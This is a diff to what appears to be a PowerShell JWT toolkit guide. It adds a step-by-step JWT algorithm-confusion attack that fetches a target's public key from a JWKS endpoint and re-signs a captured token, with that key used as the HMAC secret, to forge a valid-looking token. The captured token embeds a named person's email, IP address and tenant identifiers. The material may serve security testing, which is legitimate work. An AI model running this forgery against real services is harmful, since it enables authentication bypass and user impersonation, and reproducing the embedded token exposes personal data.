@@ -209,4 +209,22 @@ $newPayload.username = $query
 
 # 8. Generate new JWT with the altered payload above and exclude default claims (iat, nbf, and exp) signed with the discovered key:
 $newJwt = New-JsonWebToken -Claims $newPayload -HashAlgorithm SHA256 -ExcludeDefaultClaims -Key $key
+
+
+# Algorithm confusion attack:
+# 1. Pre-captured JWT
+$captureJwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Img4czl6OFBXd2x6OTJPTV9sY0gyWk5ZdTlqMCIsImtpZCI6Img4czl6OFBXd2x6OTJPTV9sY0gyWk5ZdTlqMCJ9.eyJpYXQiOjE2ODE0MTg3MzEsIm5iZiI6MTY4MTQxODczMSwiZXhwIjoxNjgxNDE5MzMxLCJhbXIiOlsicHdkIl0sInZlciI6IjEuMCIsImlkcCI6InRvbnktaWRwLmNvbSIsImZhbWlseV9uYW1lIjoiR3VpbWVsbGkiLCJhcHBpZCI6ImMyMTdhOTBiLTI0YTAtNDRlMC1hZDAyLTA0NTliNWM1ODllNSIsImp0aSI6ImQzZmFkODk3LTFmMGMtNDI2Ni1hYmExLTdjMDVlN2RkMzY4ZiIsImdpdmVuX25hbWUiOiJBbnRob255IiwiaXBhZGRyIjoiMzQuMjguMTg2LjIxIiwic3ViIjoiZng0NmN5YVFCblpKQmtkQktCNHlpQU1fUGo2S3NsaTRBMGdRQzREcXZyVSIsImVtYWlsIjoidG9ueS5ndWltZWxsaUBnbWFpbC5jb20iLCJvaWQiOiIzNWQ5NWMyYy0wNzY5LTQ4ZGYtYTg2NS1mNGMxOTdhNzcwODkiLCJ1bmlxdWVfbmFtZSI6InRvbnktaWRwLmNvbSN0b255Lmd1aW1lbGxpQHNvbWVkb21haW4uY29tIiwiZ3JvdXBzIjpbIjc0NmM4ZDc5LWQ5OTUtNDNjNy1iNGM0LTU3MWQwYjQzZWI5MyJdLCJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJwdWlkIjoiMTAwMzIwMDEwRTQ2MUQwOSIsInhtc190Y2R0IjoxNjExMDg4MTU0LCJ1dGkiOiJQNExrR296OHowQ3UydVZRdXE1cEFRIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwiaXNzIjoiaHR0cHM6Ly9zdHMudG9ueS1pZHAuY29tLzc0MDQxYzVlLTZjMDItNGFiOS05MWM0LTg2NTBlZDg0ODU2YiIsImFjciI6IjEiLCJuYW1lIjoiVG9ueSBHdWltZWxsaSIsInRpZCI6ImEwN2U0NTFiLTFkNTQtNDZkZS1hYzJmLWYwNWYyNzY4NzhlOSIsImFwcGlkYWNyIjoiMiJ9.S_apqTxvse4gqxu02HEa9vj7oeey36jpgP17UMdd93Yr-oNS82HDYk-hvuGdxYklrSg7SbS64ZVHGeUsTIPDsV4xWS7hlxAWoim3-2deq2Ns-rg66ekUowRARY8REAE3QGOwaF8fQxLBJvoV4zThaOOkOjdsEiaNC8PfzKiu-56lNv3la1lOKdjO0Q3Tm1O0niVOP22gyZjV69O30nQMGWGHr_0p3w87py_97ccPqVP1rz4ZU-pK54O44eCyaupd-58QkdxvCc1N5b2tNE-OhpHBZapoUmje3aVwyefzhW0IqiwaL8QGQzt8A9yKIJX9zo-Us_dcfEB_PAeZbA_XoA"
+
+# 2. Target JWK endpoint to obtain HMAC signing key from with target JWK ID:
+$jwkSetUri = "https://tonygauth1.azurewebsites.net/api/jwks"
+$targetKid = "h8s9z8PWwlz92OM_lcH2ZNYu9j0"
+
+# 3. Generate signing key from JWK converted to PEM:
+$signingKey = Convert-JwkToPem -Uri $jwkSetUri | Where-Object JwkIdentifier -eq $targetKid | Select-Object -ExpandProperty Pem
+
+# 4. Obtain prior payload to feed into new JWT:
+$jwtPayload = $captureJwt | Get-JsonWebTokenPayload
+
+# 5. Craft new JWT with same payload, new date ranges, and signed with public key as HMAC key:
+$badJwt = New-JsonWebToken -Claims $jwtPayload -Key $signingKey -TimeToLive 6000
 ```
